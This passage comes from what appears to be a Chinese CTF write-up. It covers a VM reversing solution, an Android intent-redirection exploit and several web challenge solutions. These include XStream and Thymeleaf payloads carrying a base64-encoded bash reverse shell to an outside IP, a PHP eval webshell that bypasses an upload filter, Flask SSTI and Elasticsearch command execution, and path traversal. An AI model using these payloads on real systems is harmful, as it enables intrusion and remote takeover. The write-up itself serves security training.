(opcode[pos + 4] shl 24)\n                pos += 5\n            }\n\n            // op a b \u5BC4\u5B58\u5668a\u7D2F\u52A0\u7ED9\u5BC4\u5B58\u5668b\u7684\u503C\u76F8\u52A0 b = a + b\n            4 -> {\n                register[opcode[pos + 2]] += register[opcode[pos + 1]]\n                pos += 2\n            }\n\n            // op a b \u5BC4\u5B58\u5668a\u51CF\u5BC4\u5B58\u5668b\u5E76\u8D4B\u503C\u7ED9\u5BC4\u5B58\u5668b b = a - b\n            5 -> {\n                register[opcode[pos + 2]] = register[opcode[pos + 1]] - register[opcode[pos + 2]]\n                pos += 2\n            }\n\n            // op a b \u5BC4\u5B58\u5668a\u4E58\u4EE5\u5BC4\u5B58\u5668b\u5E76\u8D4B\u503C\u7ED9\u5BC4\u5B58\u5668b b = a * b\n            6 -> {\n                register[opcode[pos + 2]] = register[opcode[pos + 1]] * register[opcode[pos + 2]]\n                pos += 2\n            }\n\n            // op a b \u5BC4\u5B58\u5668a\u9664\u4EE5\u5BC4\u5B58\u5668b\u5E76\u8D4B\u503C\u7ED9\u5BC4\u5B58\u5668b b = a / b\n            7 -> {\n                register[opcode[pos + 2]] = register[opcode[pos + 1]] / register[opcode[pos + 2]]\n                pos += 2\n            }\n\n            // op a b \u5BC4\u5B58\u5668b\u53D6\u4F59\u5BC4\u5B58\u5668a\u5E76\u8D4B\u503C\u7ED9\u5BC4\u5B58\u5668b b = b % a\n            8 -> {\n                register[opcode[pos + 2]] %= register[opcode[pos + 1]]\n                pos += 2\n            }\n\n            // op a \u5BC4\u5B58\u5668a\u81EA\u52A01\n            9 -> {\n                tmp2 = opcode[pos + 1]\n                register[tmp2]++\n                ++pos\n            }\n\n            // op a b \u5224\u65AD\u5BC4\u5B58\u5668a\u548C\u5BC4\u5B58\u5668b\u7684\u503C\u662F\u5426\u76F8\u7B49\n            10 -> {\n                tmp2 = register[opcode[pos + 1]]\n                tmp1 = register[opcode[pos + 2]]\n                if (pos == 68) {\n                    println("${tmp2}-${tmp1}")\n//                    tmp2 = tmp1\n                    checkDest.add(tmp1)\n                }\n                pos += 2\n                tmp1 = tmp2 - tmp1\n            }\n\n            // op a \u8DF3\u8F6C\u6307\u4EE4\n            11 -> {\n                val p = opcode[pos + 1]\n                tmp2 = pos\n                if (tmp1 != 0) {\n                    tmp2 = if (p < 128) {\n                        p\n                    } else {\n                        p - 256\n                    }\n                    tmp2 = pos + (tmp2 - 2)\n                }\n                pos = tmp2 + 1\n            }\n\n            // \u6210\u529F\n            12 -> {\n                tag = true\n                println(checkDest.joinToString(","))\n                ++pos\n            }\n        }\n        ++pos\n    }\n}\n\nfun main() {\n    vm()\n    val origin = intArrayOf(\n        67,\n        35,\n        47,\n        44,\n        57,\n        110,\n        33,\n        63,\n        51,\n        22,\n        78,\n        114,\n        87,\n        116,\n        0,\n        104,\n        15,\n        86,\n        85,\n        96,\n        109,\n        34,\n        47,\n        1,\n        91\n    )\n    val sb = StringBuilder()\n    for (i in origin.indices) {\n        sb.append(Char(origin[i] xor dest[i]))\n    }\n    println(sb.toString())\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u4EE3\u7801\u505A\u4E86\u7B80\u5355\u7684\u6CE8\u91CA\uFF0C\u4E5F\u5BF9opcode\u8FDB\u884C\u4E86\u5206\u7EC4\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5927\u4F53\u542B\u4E49\uFF0C\u5148\u5BF98\u4E2A\u5BC4\u5B58\u5668\u8FDB\u884C\u521D\u59CB\u5316\uFF0C\u7136\u540E\u5BC4\u5B58\u5668\u5185\u7684\u6570\u5B57\u8FDB\u884C\u8FD0\u7B97\uFF0C\u4E0Edest\u4E2D\u7684\u6BCF\u4E00\u4F4D\u8FDB\u884C\u6BD4\u8F83\u3002\u5982\u679C\u5168\u90E8\u6BD4\u8F83\u6210\u529F\uFF0C\u5219\u6B63\u5E38\u9000\u51FA\u8FD4\u56DE\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7531\u4E8E\u53EA\u662F\u5185\u90E8\u7684\u503C\u53C2\u6570\u8FD0\u7B97\uFF0C\u800Cdest\u5168\u7A0B\u672A\u53C2\u4E0E\uFF0C\u53EA\u662F\u7528\u4E8E\u6BD4\u8F83\u3002\u4E8E\u662F\u8FD9\u91CC\u505A\u4E86\u4E2Atrick\uFF0C\u5728\u6BD4\u8F83\u7684\u6307\u4EE4\u780111\u91CC\u8BB0\u5F55\u5F53\u524D\u8FD0\u7B97\u7684\u503C\uFF0C\u5E76\u5C06\u6BD4\u8F83\u7ED3\u679C\u5F3A\u884C\u7F6E\u4E3Atrue\u3002\u8FD9\u6837vm\u4E0D\u4F1A\u56E0\u503C\u4E0D\u76F8\u7B49\u800C\u9000\u51FA\uFF0C\u800C\u4E14\u6267\u884C\u5B8C\u6210\u7684\u7ED3\u679C\u5C31\u662F\u6700\u7EC8\u7684\u8FD0\u7B97\u7ED3\u679C\u4E86\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u522B\u6F0F\u4E86apk\u53CD\u7F16\u8BD1\u7684java\u4EE3\u7801\u91CC\u7684\u4E00\u4E2A\u903B\u8F91\uFF0C\u5C06\u8FD0\u7B97\u7ED3\u679C\u4E0E\u521D\u59CB\u6570\u7EC4\u8FDB\u884C\u5F02\u6216\uFF0C\u8FD8\u539F\u51FA\u539F\u59CB\u7684\u5B57\u7B26\u4E32\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-11-\u91CD\u5B9A\u5411\u8FDB\u9636",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-11-\u91CD\u5B9A\u5411\u8FDB\u9636",children:"#"}),"mobile-11 \u91CD\u5B9A\u5411\u8FDB\u9636"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u786E\u5B9A\u662Fbytectf\u7684\u4E00\u9053\u539F\u9898\u4E86\uFF0C\u5F53\u65F6\u8FD8\u6709\u5E78\u548C\u540C\u5B66\u4E00\u8D77\u505A\u8FC7"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u7B80\u5355\u6765\u8BF4\uFF0Cflag\u662F\u5199\u5728\u81EA\u5DF1\u76EE\u5F55\u7A7A\u95F4\u91CC\u7684\uFF0C\u5176\u5B83\u5E94\u7528\u6CA1\u6709\u76F4\u63A5\u8BBF\u95EE\u7684\u6743\u9650\u3002\u800C\u901A\u8FC7\u8F6C\u53D1intent\uFF0C\u5C31\u76F8\u5F53\u4E8E\u4F7F\u7528\u8F6C\u53D1\u4E2D\u95F4\u4EBA\u8BBF\u95EE\u81EA\u5DF1\u7684\u8D44\u6E90\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5229\u7528\u8FD9\u6B21\u8F6C\u53D1\u4E3A\u8D44\u6E90\u6388\u4E88\u8BFB\u53D6\u6743\u9650\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u96BE\u70B9\u5728\u4E8E\u600E\u4E48\u5229\u7528\u83B7\u53D6\u6587\u4EF6\u8DEF\u5F84\uFF0C\u6784\u9020provider\u7684\u8D44\u6E90uri\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u5148\u770B\u6587\u4EF6\u5199\u5165\u7684\u5730\u5740\uFF0C",(0,i.jsx)(n.code,{children:'new File(this.getFilesDir(), "flag")\uFF0CgetFilesDir()'}),"\u83B7\u53D6\u7684\u7684\u81EA\u5DF1\u76EE\u5F55\u7A7A\u95F4\u4E0B\u7684/files\u76EE\u5F55\u3002\u5E94\u7528\u7684\u76EE\u5F55\u7A7A\u95F4\u5728",(0,i.jsx)(n.code,{children:"/data/data/[package_name]/"}),"\u4E0B\uFF0C\u6240\u4EE5\u8FD9\u4E2A\u6587\u4EF6\u5199\u5165\u7684\u5730\u5740\u662F",(0,i.jsx)(n.code,{children:"/data/data/com.mictf.intent1/files/flag"}),"\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u6784\u9020\u4E00\u4E2Acontent URI\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u683C\u5F0F\u4E3A\uFF1A",(0,i.jsx)(n.code,{children:"content://[authorities]/[name]/[file_relative_path]"})]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:'authorities \u5728AndroidManifest.xml\u6587\u4EF6\u6709\u63D0\u5230\uFF0C\u8FD9\u91CC\u662Fandroid:authorities="com.mictf.flag"'}),"\n",(0,i.jsxs)(n.li,{children:["name \u4EE3\u8868\u6839\u8DEF\u5F84\u7684\u522B\u79F0\uFF0C\u8FD9\u4E2A\u5728/res/xml/file_paths.xml\u6587\u4EF6\u91CC\uFF0C\u8FD9\u91CC\u662F",(0,i.jsx)(t,{name:"root",path:""})]}),"\n",(0,i.jsx)(n.li,{children:"file_relative_path \u5C31\u662F\u4E0A\u9762\u5199\u5165\u7684\u8D44\u6E90\u8DEF\u5F84\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u6784\u9020\u51FA\u6765\u7684contentURI\u5C31\u662F"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"content://com.mictf.flag/root/data/data/com.mictf.intent1/files/flag\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5199\u4E2Aintent\u5229\u7528\u4E00\u4E0B\uFF1A"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'fun attack() {\n    val pwn = Intent("PWN")\n    pwn.setClassName("com.mictf.intent1", "com.mictf.intent1.MainActivity")\n    pwn.data =\n        Uri.parse("content://com.mictf.flag/root/data/data/com.mictf.intent1/files/flag")\n    pwn.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or\n        Intent.FLAG_GRANT_WRITE_URI_PERMISSION)\n   \n    startActivityForResult(pwn, 0)\n}\n\noverride fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {\n    super.onActivityResult(requestCode, resultCode, data)\n    if (data?.action == "PWN") {\n        val intentData = data.data\n        val isr = InputStreamReader(contentResolver.openInputStream(intentData!!))\n        val buf = CharArray(1024)\n        val sb = StringBuffer("")\n        while (-1 != isr.read(buf, 0, 1024)) {\n            sb.append(String(buf))\n        }\n        val flag = String(sb)\n        Toast.makeText(this, flag, Toast.LENGTH_LONG).show()\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u73B0\u8C61\u662F\u5148\u4ECEattackapp\u8DF3\u8F6C\u5230\u5BF9\u5E94\u7684\u76EE\u6807Activity\uFF0C\u6309back\u8FD4\u56DE\u540E\uFF0C\u56DE\u5230attackapp\uFF0C\u540C\u65F6Toast\u6253\u5370\u4E86flag\u6587\u4EF6\u91CC\u7684\u5185\u5BB9\u3002"}),"\n",(0,i.jsxs)(n.h2,{id:"web",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web",children:"#"}),"Web"]}),"\n",(0,i.jsxs)(n.h3,{id:"web-1-\u804A\u5929\u5BA4",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-1-\u804A\u5929\u5BA4",children:"#"}),"web-1 \u804A\u5929\u5BA4"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u4E3A\u4EC0\u4E48live2d\u5C55\u793A\u4E0D\u51FA\u6765\u3002\u3002\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u76F4\u63A5\u7FFB\u6E90\u7801\uFF0C\u627E\u5230flag"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"flag_in_source",src:J})}),"\n",(0,i.jsxs)(n.h3,{id:"web-2-\u98CE\u9669\u7EC4\u4EF6",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-2-\u98CE\u9669\u7EC4\u4EF6",children:"#"}),"web-2 \u98CE\u9669\u7EC4\u4EF6"]}),"\n",(0,i.jsx)(n.p,{children:"\u653E\u51FA\u4E86hint\uFF0C\u63D0\u5230xStream\u7EC4\u4EF6\u3002\u53D1\u73B0\u7248\u672C\u662F1.4.10\uFF0C\u6D1E\u6D1E\u5F88\u591A\u3002\u4F46\u662F\u8BD5\u4E86\u597D\u4E45\u90FD\u6CA1\u6210\u529F\u3002\u6700\u540E\u7EC8\u4E8E\u53D1\u73B0\uFF0C\u53CD\u5F39shell\u5199\u9519\u4E86\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u57FA\u672C\u4E0A\u90FD\u662F\u5229\u7528xStream\u5728\u53D1\u5E8F\u5217\u5316xml\u65F6\u5019\u7684\u6F0F\u6D1E\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5148\u5728\u81EA\u5DF1\u670D\u52A1\u5668\u4E0Anc\u76D1\u542C\u4E00\u4E2A\u7AEF\u53E3"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"nc -lvvp 8212\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u6784\u9020\u4E00\u4E2APOC\uFF0C\u63D0\u4EA4\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",meta:"request",children:'POST /login HTTP/2\nHost: vul-xs-ctf.dun.mi.com\nCookie: MIDUN-Cookie\nContent-Length: 630\nSec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"\nAccept: application/json, text/plain, */*\nContent-Type: application/xml\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\nSec-Ch-Ua-Platform: "macOS"\nOrigin: https://vul-xs-ctf.dun.mi.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://vul-xs-ctf.dun.mi.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n<sorted-set>\n    <string>foo</string>\n    <dynamic-proxy>\n        <interface>java.lang.Comparable</interface>\n        <handler class="java.beans.EventHandler">\n            <target class="java.lang.ProcessBuilder">\n                <command>\n                          <string>/bin/bash</string>\n                          <string>-c</string>\n                          <string>\n{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMzUuNDguMzYvODIxMiAwPiYx77u/}|{base64,-d}|{bash,-i}\n</string>\n                </command>\n            </target>\n            <action>start</action>\n        </handler>\n    </dynamic-proxy>\n</sorted-set>\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u9879\u76EE\u76EE\u5F55\u5C31\u53EF\u4EE5\u770B\u5230\u4E86flag\u6587\u4EF6\u4E86\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"web-3-\u7B80\u5355\u6587\u4EF6\u5305\u542B",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-3-\u7B80\u5355\u6587\u4EF6\u5305\u542B",children:"#"}),"web-3 \u7B80\u5355\u6587\u4EF6\u5305\u542B"]}),"\n",(0,i.jsx)(n.p,{children:"\u5148\u5C1D\u8BD5\u4E00\u4E9B\u534F\u8BAE\uFF0Cphpinput\u90FD\u65E0\u6CD5\u4F7F\u7528\uFF0C\u5148\u7528base64\u83B7\u53D6\u5230upload.php\u6E90\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'# /index.php?file=php://filter/read=convert.base64-encode/resource=upload.php\n\n<?php\n        if(isset($_FILES[\'upfile\'])){\n                $uploaddir = \'uploads/\';\n                $uploadfile = $uploaddir . basename($_FILES[\'upfile\'][\'name\']);\n                $ext = pathinfo($_FILES[\'upfile\'][\'name\'],PATHINFO_EXTENSION);\n\n                //\u68C0\u67E5\u6587\u4EF6\u5185\u5BB9\n                $text = file_get_contents($_FILES[\'upfile\'][\'tmp_name\']);\n\n\n                echo $ext;\n\n                //\u68C0\u67E5\u6587\u4EF6\u540E\u7F00\n                if (!preg_match("/ph.|htaccess/i", $ext)){\n\n                        if(preg_match("/<\\?php/i", $text)){\n                                echo "\u4F60\u7684\u6587\u4EF6\u5185\u5BB9\u6709\u6076\u610F\u4EE3\u7801<br>";\n                        }\n                        else{\n                                move_uploaded_file($_FILES[\'upfile\'][\'tmp_name\'],$uploadfile);\n                                echo "\u4E0A\u4F20\u6210\u529F<br>\u8DEF\u5F84\u4E3A:" . $uploadfile . "<br>";\n                        }\n                } \n                else {\n                        echo "\u6076\u610F\u540E\u7F00<br>";\n                        \n                }\n        }\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n        <title>\u4E0A\u4F20\u6587\u4EF6</title>\n        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\n</head>\n<body>\n        \u8BF7\u4E0D\u8981\u4E0A\u4F20php\u811A\u672C\u54DF\n        <form action="upload.php" method="POST" enctype="multipart/form-data">\n                <input type="file" name="upfile" value="" />\n                <input type="submit" name="submit" value="\u63D0\u4EA4" />\n        </form>\n</body>\n</html>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u8FC7\u6EE4\u8FD8\u662F\u633A\u4E25\u683C\u7684\uFF0C\u5BF9\u540E\u7F00\u548C\u5185\u5BB9\u90FD\u8FDB\u884C\u4E86\u5224\u65AD\u3002\u540E\u6765\u4E86\u89E3\u5230\u9664\u4E86",(0,i.jsx)(n.code,{children:"<?php"}),"\u53EF\u4EE5\u4F5C\u4E3Aphp\u811A\u672C\u4EE5\u5916\uFF0Chtml\u6807\u7B7E\u4E5F\u53EF\u4EE5",(0,i.jsx)(n.code,{children:"<script language='php'>"}),"\uFF0C\u4E8E\u662F\u4E0A\u4F20\u4E00\u4E2A\u8BE5\u6807\u7B7E\u7684\u811A\u672C\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:"<script language='php'>\n@eval($_POST['hack']);\n<\/script>\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8681\u5251\u8FDE\u63A5\u83B7\u53D6flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u8681\u5251\u8FDE\u63A5",src:Q})}),"\n",(0,i.jsxs)(n.h3,{id:"web-4-\u4E0D\u5B89\u5168\u7684redis\u670D\u52A1",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-4-\u4E0D\u5B89\u5168\u7684redis\u670D\u52A1",children:"#"}),"web-4 \u4E0D\u5B89\u5168\u7684Redis\u670D\u52A1"]}),"\n",(0,i.jsx)(n.p,{children:"\u672A\u8BA4\u8BC1\u7684redis\uFF0C\u627E\u4E86\u51E0\u4E2A\u5229\u7528\u65B9\u5F0F\uFF0C\u5229\u7528\u6570\u636E\u5907\u4EFD\u529F\u80FD\uFF0C\u6761\u4EF6\u90FD\u6BD4\u8F83\u82DB\u523B\uFF1A"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"cron \u53CD\u5F39shell \u2014\u2014 cron\u76EE\u5F55\u88AB\u5220\u9664"}),"\n",(0,i.jsx)(n.li,{children:"\u5199\u5165ssh key \u2014\u2014 ssh \u62D2\u7EDD\u8FDE\u63A5"}),"\n",(0,i.jsx)(n.li,{children:"\u5199\u5165php\u6728\u9A6C \u2014\u2014 \u672A\u63D0\u4F9Bphp\u670D\u52A1"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u540E\u6765\u627E\u5230\u4E00\u4E2A\u5229\u7528\u4E3B\u4ECE\u52A0\u8F7Dso\u6587\u4EF6\u7684\u5229\u7528\u65B9\u5F0F\uFF0C\u6210\u529F\u83B7\u53D6\u4EA4\u4E92\u5F0Fshell"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://www.cnblogs.com/paperpen/p/11178751.html",target:"_blank",rel:"noopener noreferrer",children:"https://www.cnblogs.com/paperpen/p/11178751.html"})}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u6839\u76EE\u5F55\u4E0B\u83B7\u53D6\u5230flag"}),"\n",(0,i.jsxs)(n.h3,{id:"web-5-\u771F\u5047\u96BE\u8FA8",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-5-\u771F\u5047\u96BE\u8FA8",children:"#"}),"web-5 \u771F\u5047\u96BE\u8FA8"]}),"\n",(0,i.jsx)(n.p,{children:"\u8BBF\u95EEindes.php\u4F1A\u81EA\u52A8\u8DF3\u8F6C\u5230index.php\uFF0C\u4ECE\u800C\u51FA\u73B0404"}),"\n",(0,i.jsx)(n.p,{children:"\u7528postman\u8BBF\u95EE\uFF0C\u7981\u7528\u81EA\u52A8\u8DF3\u8F6C\uFF0C\u5728header\u91CC\u627E\u5230\u4E86flag"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"postman\u7981\u6B62\u8DF3\u8F6C",src:Y})}),"\n",(0,i.jsxs)(n.h3,{id:"web-6-\u4F4E\u7248\u672C\u7684flask",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-6-\u4F4E\u7248\u672C\u7684flask",children:"#"}),"web-6 \u4F4E\u7248\u672C\u7684Flask"]}),"\n",(0,i.jsx)(n.p,{children:"\u5728url\u91CC\u586B\u5199name\u53C2\u6570\u540E\uFF0C\u8BBF\u95EE\u7684\u9875\u9762\u4F1A\u6253\u5370\u586B\u5165\u7684\u5185\u5BB9\uFF0C\u731C\u6D4B\u662F\u4E2A\u6A21\u677F\u5F15\u64CE\u7684\u6267\u884C\u6F0F\u6D1E\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u627E\u5230\u4E86\u4F4E\u7248\u672CFlask SSTI\u6F0F\u6D1E\uFF0Cflask\u4F7F\u7528jinjia2\u6E32\u67D3\u5F15\u64CE\u8FDB\u884C\u7F51\u9875\u6E32\u67D3\uFF0C\u5F53\u5904\u7406\u4E0D\u5F97\u5F53\uFF0C\u672A\u8FDB\u884C\u8BED\u53E5\u8FC7\u6EE4\uFF0C\u7528\u6237\u8F93\u5165{{\u63A7\u5236\u8BED\u53E5}}\uFF0C\u4F1A\u5BFC\u81F4\u6E32\u67D3\u51FA\u6076\u610F\u4EE3\u7801\uFF0C\u5F62\u6210\u6CE8\u5165\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6784\u9020\u6CE8\u5165\u8BED\u53E5\uFF0C\u53EF\u4EE5\u6267\u884C\u4EFB\u610F\u7684shell\u8BED\u53E5\uFF0C\u627E\u5230flag\u6587\u4EF6cat\u83B7\u53D6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"https://easyweb01.dun.mi.com/?name={{%27abc%27.__class__.__mro__[1].__subclasses__()[118].__init__.__globals__[%27popen%27](%27cat%20flag%27).read()}}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u91CC\u6BD4\u8F83\u9EBB\u70E6\u7684\u4E00\u4E2A\u662F\u5982\u4F55\u83B7\u53D6os._wrap_close\u7C7B\u6765\u6267\u884Cshell\u547D\u4EE4\uFF0C\u901A\u8FC7\u67E5\u627E\u53D1\u73B0\u5728\u6240\u6709\u5B50\u7C7B\u7684118\u4F4D\u3002\u8FD9\u4E2A\u662F\u6162\u6162\u8BD5\u51FA\u6765\u7684\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"web-7-\u7C97\u5FC3\u4E0A\u7EBF",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-7-\u7C97\u5FC3\u4E0A\u7EBF",children:"#"}),"web-7 \u7C97\u5FC3\u4E0A\u7EBF"]}),"\n",(0,i.jsxs)(n.p,{children:["\u8FD9\u4E2A\u9898\u76EE\u524D\u671F\u7ED9\u7684\u4FE1\u606F\u5F88\u5C11\uFF0C\u8FD9\u91CC\u731C\u6D4B\u4E86\u4E00\u4E0B\uFF0C\u662F\u4E0D\u662F\u628A\u76EE\u5F55\u76F4\u63A5\u62F7\u8D1D\u4E0A\u7EBF\u4E86\uFF0C\u6CA1\u6709\u6CE8\u610F.git\u76EE\u5F55\u7684\u5B58\u5728\u3002\u8BBF\u95EE ",(0,i.jsx)(n.a,{href:"http://10.167.93.41/.git/",target:"_blank",rel:"noopener noreferrer",children:"http://10.167.93.41/.git/"})," \u51FA\u73B0\u4E86\u7981\u6B62\u8BBF\u95EE\u7684\u5B57\u6837\uFF0C\u8BF4\u660E\u8FD9\u4E2A\u76EE\u5F55\u662F\u5B58\u5728\u7684\u3002",(0,i.jsx)(n.a,{href:"http://10.167.93.41/.git/HEAD/",target:"_blank",rel:"noopener noreferrer",children:"http://10.167.93.41/.git/HEAD/"})," \u4E5F\u6210\u529F\u83B7\u53D6\u5230\u4E86\u6700\u65B0\u5206\u652F\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5269\u4E0B\u7684\u5C31\u597D\u529E\u4E86\uFF0C\u627E\u5230\u4E00\u4E2A\u5229\u7528\u5DE5\u5177 ",(0,i.jsx)(n.a,{href:"https://github.com/lijiejie/GitHack",target:"_blank",rel:"noopener noreferrer",children:"https://github.com/lijiejie/GitHack"})," \uFF0C\u6267\u884C\u547D\u4EE4"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",meta:"",children:"python3 GitHack.py http://10.167.93.41/.git/\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u4F1A\u5C06\u8FDC\u7A0B\u7684.git\u4E0B\u8F7D\u4E0B\u6765\u7136\u540E\u8FD8\u539F\u51FAflag\u6587\u4EF6\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"web-8-elasticsearch",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-8-elasticsearch",children:"#"}),"web-8 ElasticSearch"]}),"\n",(0,i.jsx)(n.p,{children:"es\u7684\u8FDC\u7A0B\u6267\u884C\uFF0C\u6784\u9020\u4E00\u4E2APOST\u8BF7\u6C42\uFF0C\u83B7\u53D6\u5230flag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:'POST https://ctf-es.dun.mi.com/_search?pretty\n\n{\n    "size": 1,\n    "query": {\n      "filtered": {\n        "query": {\n          "match_all": {\n          }\n        }\n      }\n    },\n    "script_fields": {\n        "command": {\n            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"cat /flag\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"\n        }\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"web-9-\u624D\u5F00\u59CB\u5B66nginx",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-9-\u624D\u5F00\u59CB\u5B66nginx",children:"#"}),"web-9 \u624D\u5F00\u59CB\u5B66nginx"]}),"\n",(0,i.jsx)(n.p,{children:"html\u6E90\u7801\u63D0\u793A\u4E86flag\u7684\u4F4D\u7F6E"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"html\u6CE8\u91CA\u63D0\u793A\u4E86",src:ee})}),"\n",(0,i.jsx)(n.p,{children:"\u731C\u6D4B\u662F\u4E2A\u8DEF\u5F84\u904D\u5386\u95EE\u9898\uFF0C\u8BD5\u4E86\u4E00\u4E0B/files/\u679C\u7136\u5217\u51FA\u4E86\u8DEF\u5F84\uFF0C\u6784\u9020\u4E00\u4E2A\u6307\u5411/tmp\u76EE\u5F55\u7684\u8DEF\u5F84\uFF0C\u4E0B\u8F7Dflag\u6587\u4EF6\u62FF\u5230flag\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"https://vul-nginx-ctf.dun.mi.com/files../tmp/\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-10-\u6807\u51C6\u6A21\u677F\u6B22\u8FCE\u5149\u4E34",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-10-\u6807\u51C6\u6A21\u677F\u6B22\u8FCE\u5149\u4E34",children:"#"}),"web-10 \u6807\u51C6\u6A21\u677F\uFF1A\u6B22\u8FCE\u5149\u4E34"]}),"\n",(0,i.jsx)(n.p,{children:"\u653E\u51FAhint\u63D0\u793A\u6A21\u677F\u5F15\u64CE\u4F7F\u7528\u4E86thymeleaf\uFF0C\u770B\u8DEF\u5F84\u5305\u542B\u7684\u9875\u9762\u662F\u901A\u8FC7url\u53C2\u6570\u4F20\u5165\u7684\uFF0C\u6784\u9020POC\u6267\u884C\u53CD\u5F39shell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:'PATH=\n__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4yMzUuNDguMzYvODIxMiAwPiYx77u/}|{base64,-d}|{bash,-i}").getInputStream()).next()}__::.x\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",meta:"request",children:'GET /welcome?path=__%24%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22bash%20-c%20%7becho%2cYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4yMzUuNDguMzYvODIxMiAwPiYx77u%2f%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22).getInputStream()).next()%7d__%3a%3a.x HTTP/2\nHost: 